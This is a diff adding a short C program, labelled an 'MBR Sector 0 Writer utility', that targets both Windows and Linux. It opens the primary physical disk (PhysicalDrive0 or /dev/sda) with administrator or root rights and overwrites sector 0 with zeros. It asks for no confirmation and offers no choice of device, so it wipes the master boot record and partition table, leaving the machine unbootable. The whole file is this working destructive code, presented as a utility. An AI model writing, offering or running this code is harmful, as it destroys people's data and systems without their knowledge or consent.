@@ -1,0 +1,101 @@
+#include <stdio.h>
+#include <stdlib.h>
+
+// ==========================================
+// WINDOWS IMPLEMENTATION
+// ==========================================
+#ifdef _WIN32
+#include <windows.h>
+
+int run_windows_overwrite() {
+    printf("[*] Target OS detected: Windows\n");
+    printf("[*] Attempting to open physical drive... (Requires Administrator)\n");
+
+    // 1. Open a handle to the primary physical drive directly
+    HANDLE hDisk = CreateFileA(
+        "\\\\.\\PhysicalDrive0", 
+        GENERIC_WRITE, 
+        FILE_SHARE_READ | FILE_SHARE_WRITE, 
+        NULL, 
+        OPEN_EXISTING, 
+        0, 
+        NULL
+    );
+
+    if (hDisk == INVALID_HANDLE_VALUE) {
+        DWORD error = GetLastError();
+        fprintf(stderr, "[-] Error opening physical drive. Code: %lu\n", error);
+        if (error == ERROR_ACCESS_DENIED) {
+            fprintf(stderr, "[-] Permission Denied: Please run this program as Administrator.\n");
+        }
+        return 1;
+    }
+
+    // 2. Define a clean 512-byte buffer initialized to zero
+    unsigned char masterBootRecord[512] = { 0 }; 
+
+    // 3. Write directly to Sector 0
+    DWORD bytesWritten = 0;
+    BOOL result = WriteFile(hDisk, masterBootRecord, 512, &bytesWritten, NULL);
+    
+    if (!result || bytesWritten != 512) {
+        fprintf(stderr, "[-] Error writing to Sector 0. Code: %lu\n", GetLastError());
+        CloseHandle(hDisk);
+        return 1;
+    }
+
+    printf("[+] Successfully wrote %lu bytes to Windows Sector 0!\n", bytesWritten);
+    CloseHandle(hDisk);
+    return 0;
+}
+
+// ==========================================
+// LINUX IMPLEMENTATION
+// ==========================================
+#else
+#include <unistd.h>
+#include <fcntl.h>
+
+int run_linux_overwrite() {
+    printf("[*] Target OS detected: Linux\n");
+    printf("[*] Attempting to open block device... (Requires Root)\n");
+
+    // 1. Open the raw block device file for writing
+    int fd = open("/dev/sda", O_WRONLY);
+    
+    if (fd < 0) {
+        perror("[-] Error opening device");
+        fprintf(stderr, "[-] Hint: Make sure the disk exists and you are running with 'sudo'.\n");
+        return 1;
+    }
+
+    // 2. Define a clean 512-byte buffer initialized to zero
+    unsigned char masterBootRecord[512] = { 0 };
+
+    // 3. Write directly to the beginning of the disk (Sector 0)
+    ssize_t bytesWritten = write(fd, masterBootRecord, 512);
+
+    if (bytesWritten != 512) {
+        perror("[-] Error writing to device");
+        close(fd);
+        return 1;
+    }
+
+    printf("[+] Successfully wrote %zd bytes to Linux Sector 0!\n", bytesWritten);
+    close(fd);
+    return 0;
+}
+#endif
+
+// ==========================================
+// MAIN ENTRY POINT
+// ==========================================
+int main() {
+    printf("[*] Starting MBR Sector 0 Writer utility...\n");
+    
+    #ifdef _WIN32
+        return run_windows_overwrite();
+    #else
+        return run_linux_overwrite();
+    #endif
+}
